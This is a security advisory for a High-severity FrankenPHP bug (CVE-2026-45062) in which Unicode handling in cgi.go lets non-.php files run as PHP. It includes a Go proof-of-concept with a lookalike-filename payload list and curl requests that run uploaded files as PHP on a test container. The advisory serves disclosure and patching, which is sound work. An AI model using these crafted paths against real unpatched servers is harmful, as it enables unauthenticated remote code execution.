# [H] FrankenPHP: Unsafe Unicode Handling in CGI Path Splitting Allows Execution of Non-PHP Files

## Summary
Severity: High
Advisory: GHSA-3g8v-8r37-cgjm
CVE: CVE-2026-45062
CWE: CWE-176, CWE-178, CWE-20
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H (CVSS_V3)
Published: 2026-05-15
Source: https://github.com/advisories/GHSA-3g8v-8r37-cgjm
Type: github-advisory

## Affected
- Go: `github.com/dunglas/frankenphp` — affected >=1.11.2 <1.12.3

## Details
### Summary

The `splitPos()` function in [`cgi.go`](https://github.com/php/frankenphp/blob/main/cgi.go) misuses `golang.org/x/text/search` with `search.IgnoreCase` when the request path contains a non-ASCII byte. Two distinct flaws in that fallback let an attacker mislead FrankenPHP into treating a non-`.php` file as a `.php` script. In any deployment where the attacker can place content into a file served by FrankenPHP (uploads, file storage, etc.), this can be escalated to remote code execution by crafting a URL whose path triggers either flaw.

This advisory consolidates two independent reports against the same function (the duplicate, GHSA-v4h7-cj44-8fc8, has been closed). Both were reported by @KC1zs4.

### Details

```go
var splitSearchNonASCII = search.New(language.Und, search.IgnoreCase)

func splitPos(path string, splitPath []string) int {
	if len(splitPath) == 0 {
		return 0
	}
	pathLen := len(path)
	for _, split := range splitPath {
		splitLen := len(split)
		for i := 0; i < pathLen; i++ {
			if path[i] >= utf8.RuneSelf {
				if _, end := splitSearchNonASCII.IndexString(path, split); end > -1 {
					return end
				}
				break
			}
			if i+splitLen > pathLen {
				continue
			}
			match := true
			for j := 0; j < splitLen; j++ {
				c := path[i+j]
				if c >= utf8.RuneSelf {
					if _, end := splitSearchNonASCII.IndexString(path, split); end > -1 {
						return end
					}
					break // <-- flaw 1: 'match' is still true
				}
				if 'A' <= c && c <= 'Z' {
					c += 'a' - 'A'
				}
				if c != split[j] {
					match = false
					break
				}
			}
			if match {
				return i + splitLen
			}
		}
	}
	return -1
}
```

#### Flaw 1 — Control-flow: stale `match` after inner non-ASCII fallback

In the inner `for j` loop, when a byte satisfies `c >= utf8.RuneSelf` and `splitSearchNonASCII.IndexString(...)` returns `-1`, the loop `break`s without setting `match = false`. The outer code then evaluates `if match { return i + splitLen }` with `match` still `true`, returning a position as if `.php` had been matched. The script-name suffix actually present at that offset is whatever bytes the attacker chose, so a file named `name.<U+00A1>.txt` gets routed as PHP.

#### Flaw 2 — Unicode equivalence: `search.IgnoreCase` folds non-ASCII lookalikes onto ASCII

`search.New(language.Und, search.IgnoreCase)` performs Unicode equivalence matching (compatibility decomposition + case folding), which goes far beyond the ASCII-only case folding the surrounding code is built for. Many code points fold onto ASCII `.`, `p`, `h`, `p`, so a path containing `﹒php`, `．php`, `.ｐhp`, `.ⓟⓗⓟ`, `.𝗽𝗵𝗽`, `.𝓅𝒽𝓅`, `.𝖕𝖍𝖕`, etc. is reported as `.php`.

Both flaws share the same root cause: invoking `search.IgnoreCase` to match an ASCII-only, validated-lower-case split entry against an arbitrary path. `WithRequestSplitPath` already guarantees every entry is ASCII and lower-cased, so any byte `>= utf8.RuneSelf` in the path can never be part of a legitimate match — but the fallback ignored that guarantee.

### PoC

Standalone reproducer (copy `splitPos` from `cgi.go` verbatim, plus the imports):

```go
package main

import (
	"fmt"
	"unicode/utf8"

	"golang.org/x/text/language"
	"golang.org/x/text/search"
)

var splitSearchNonASCII = search.New(language.Und, search.IgnoreCase)

// ... splitPos copied verbatim from cgi.go ...

func main() {
	split := []string{".php"}
	payloads := []string{
		// flaw 1
		"/PoC-match-unset.txt",   // expected: -1
		"/PoC-match-unset.¡.txt", // expected: -1, actual: 20

		// flaw 2
		"/shell﹒php",          // ﹒ small full stop
		"/shell．php",          // ． fullwidth full stop
		"/shell.ｐhp",          // ｐ fullwidth p
		"/shell.pｈp",          // ｈ fullwidth h
		"/shell.ⓟⓗⓟ",                 // ⓟⓗⓟ circled
		"/shell.\U0001D5FD\U0001D5F5\U0001D5FD",     // 𝗽𝗵𝗽 mathematical sans-serif bold
		"/shell.\U0001D4C5\U0001D4BD\U0001D4C5",     // 𝓅𝒽𝓅 mathematical script
		"/shell.ⓟⓗⓟ.anything-after-payload.php",
	}
	for _, p := range payloads {
		fmt.Printf("%-50s : %d\n", p, splitPos(p, split))
	}
}
```

Run `go run poc.go`:

```text
/PoC-match-unset.txt                               : -1
/PoC-match-unset.¡.txt                             : 20
/shell﹒php                                        : 12
/shell．php                                        : 12
/shell.ｐhp                                         : 12
/shell.pｈp                                         : 12
/shell.ⓟⓗⓟ                                          : 16
/shell.𝗽𝗵𝗽                                          : 19
/shell.𝓅𝒽𝓅                                          : 19
/shell.ⓟⓗⓟ.anything-after-payload.php               : 16
```

Every value other than `-1` is a wrong answer: `splitPos` claims `.php` was matched at the printed offset, so `SCRIPT_FILENAME` is set to the corresponding non-PHP file (which PHP then loads and executes).

#### End-to-end demo

Directory layout:

```
.
├── Caddyfile          # `:8080 { root * /app/public; php }`
└── public/
    ├── index.php
    ├── poc-match-unset.¡.   # contains <?php echo "marker=flaw1\n"; ?>
    └── poc-search-norm.𝗽𝗵𝗽  # contains <?php echo "marker=flaw2\n"; ?>
```

```bash
docker run --rm -d --name frankenphp-poc \
  -p 18080:8080 \
  -v "$(pwd)/Caddyfile:/etc/frankenphp/Caddyfile:ro" \
  -v "$(pwd)/public:/app/public" \
  dunglas/frankenphp:latest

# baseline (correctly fails to map a .txt or non-php file to PHP)
curl -i --path-as-is "http://127.0.0.1:18080/poc-match-unset.txt/trigger"
curl -i --path-as-is "http://127.0.0.1:18080/poc-search-norm/trigger"

# flaw 1 — runs poc-match-unset.¡. as PHP
curl -i --path-as-is "http://127.0.0.1:18080/poc-match-unset.%C2%A1.txt/trigger"

# flaw 2 — runs poc-search-norm.𝗽𝗵𝗽 as PHP
curl -i --path-as-is "http://127.0.0.1:18080/poc-search-norm.%F0%9D%97%BD%F0%9D%97%B5%F0%9D%97%BD.anything-after-payload.php/trigger"
```

Both crafted requests respond with the marker payload from the non-`.php` file, confirming arbitrary code execution through the body of attacker-controlled files.

### Impact

Comparable in shape to [CVE-2026-24895](https://github.com/php/frankenphp/security/advisories/GHSA-g966-83w7-6w38) but with a stricter precondition: the attacker needs the ability to place content into a file whose name matches one of the bypass patterns (the Unicode lookalike forms or a name containing a non-ASCII byte after a `.`). Where that precondition holds — common in upload endpoints, user-content stores, package mirrors, etc. — the bypass yields RCE in the FrankenPHP process via a single crafted URL, without authentication, over the network. CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H — High (8.1).

### Patch

Both flaws share a single fix: drop the `golang.org/x/text/search` fallback entirely and treat any byte `>= utf8.RuneSelf` in the path as a non-match. Split entries are validated ASCII-only and lower-cased upstream, so this preserves correct behavior for every legitimate path while making the Unicode bypasses unrepresentable. The replacement is a tight byte loop with no library calls in the hot path.

### Credit

Both flaws were reported by @KC1zs4.

## References
- https://github.com/php/frankenphp/security/advisories/GHSA-3g8v-8r37-cgjm
- https://nvd.nist.gov/vuln/detail/CVE-2026-45062
- https://github.com/php/frankenphp/commit/2d0f480329a02571d6f635dad9fdb066e1a11e81
- https://github.com/php/frankenphp
- https://github.com/php/frankenphp/releases/tag/v1.12.3
